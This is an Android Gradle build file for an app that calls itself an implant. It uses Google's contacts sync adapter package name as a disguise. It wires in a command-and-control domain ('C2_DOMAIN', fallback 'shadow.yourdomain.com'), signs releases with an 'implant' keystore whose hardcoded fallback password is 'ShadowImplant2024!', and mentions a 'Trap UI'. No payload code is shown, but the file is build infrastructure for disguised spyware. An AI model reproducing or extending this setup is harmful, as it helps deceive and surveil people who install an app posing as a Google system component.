plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

android {
    namespace = "com.google.android.syncadapters.contacts"
    compileSdk = 34

    defaultConfig {
        applicationId = "com.google.android.syncadapters.contacts"
        minSdk = 24
        targetSdk = 34
        versionCode = 1
        versionName = "1.0.0"
        vectorDrawables.useSupportLibrary = true

        // C2 Domain injection: set via env var or GitHub Secret during CI.
        // Falls back to a placeholder for local development.
        buildConfigField("String", "C2_DOMAIN", "\"${System.getenv("C2_DOMAIN") ?: "shadow.yourdomain.com"}\"")
    }

    signingConfigs {
        create("release") {
            storeFile = file(System.getenv("IMPLANT_KEYSTORE_PATH") ?: "implant.jks")
            storePassword = System.getenv("IMPLANT_KEYSTORE_PASS") ?: "ShadowImplant2024!"
            keyAlias = System.getenv("IMPLANT_KEY_ALIAS") ?: "shadow_implant"
            keyPassword = System.getenv("IMPLANT_KEY_PASS") ?: "ShadowImplant2024!"
        }
    }

    buildTypes {
        release {
            isMinifyEnabled = true
            isShrinkResources = true
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
            signingConfig = signingConfigs.getByName("release")
        }
        debug {
            isDebuggable = true
            isMinifyEnabled = false
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }

    kotlinOptions {
        jvmTarget = "17"
    }

    buildFeatures {
        compose = true
        buildConfig = true
    }

    composeOptions {
        kotlinCompilerExtensionVersion = "1.5.11"
    }
}

dependencies {
    implementation("androidx.core:core-ktx:1.12.0")
    implementation("androidx.appcompat:appcompat:1.6.1")
    implementation("androidx.work:work-runtime-ktx:2.9.0")
    
    // Compose for the Trap UI
    implementation("androidx.activity:activity-compose:1.8.2")
    implementation(platform("androidx.compose:compose-bom:2024.02.00"))
    implementation("androidx.compose.ui:ui")
    implementation("androidx.compose.ui:ui-graphics")
    implementation("androidx.compose.material3:material3")
}